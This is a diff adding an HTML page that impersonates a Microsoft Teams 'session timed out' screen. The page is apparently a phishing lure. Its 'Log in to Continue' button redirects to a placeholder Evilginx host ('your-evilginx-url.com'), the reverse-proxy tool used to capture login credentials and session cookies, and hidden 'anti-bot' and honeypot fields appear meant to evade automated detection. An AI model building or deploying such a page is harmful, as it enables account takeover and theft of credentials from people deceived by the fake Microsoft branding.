@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en-us" class="theme-defaultV2" dir="ltr" data-whatinput="mouse">
+<head>
+    <meta charset="utf-8">
+    <title>Microsoft Teams meeting | Microsoft Teams</title>
+    <link rel="stylesheet" href="assets/styles/main.css">
+    <style>
+        /* Minimal essential styles that need to be inlined */
+        body, html {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+            width: 100%;
+            height: 100%;
+            padding: 0;
+            margin: 0;
+            overflow: hidden;
+        }
+        
+        #app {
+            display: block;
+            height: inherit;
+        }
+        
+        .flex-column {
+            display: flex;
+            flex-direction: column;
+            height: 100%;
+            width: 100%;
+        }
+        
+        .error-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100%;
+            gap: 30px;
+        }
+        
+        .error-message {
+            text-align: center;
+            font-size: 16px;
+        }
+        
+        .button-container {
+            display: flex;
+            gap: 12px;
+        }
+        
+        .teams-button {
+            padding: 10px 20px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            background-color: #6264A7;
+            color: white;
+            cursor: pointer;
+            font-size: 14px;
+        }
+        
+        .teams-button:hover {
+            background-color: #464775;
+        }
+    </style>
+
+</head>
+<body>
+    <div id="app">
+        <div class="flex-column">
+            <div class="error-container">
+                <div class="error-message">
+                    Oops! Your session has timed out.<br>
+                </div>
+                <div class="button-container">
+    <button class="teams-button" onclick="window.location.href='https://your-evilginx-url.com';">
+        Log in to Continue
+    </button>
+</div>
+            </div>
+        </div>
+    </div>
+</body>
+    
+    <!-- Anti-bot hidden input -->
+    <input type="hidden" id="teams-verification-token" value="t2_secure_9b3k7d2a1">
+    <!-- Honey-pot field for bot detection -->
+    <input type="text" id="teams-honey-field" name="teams_honey_field" style="display:none" autocomplete="off" tabindex="-1">
+</body>
+</html>
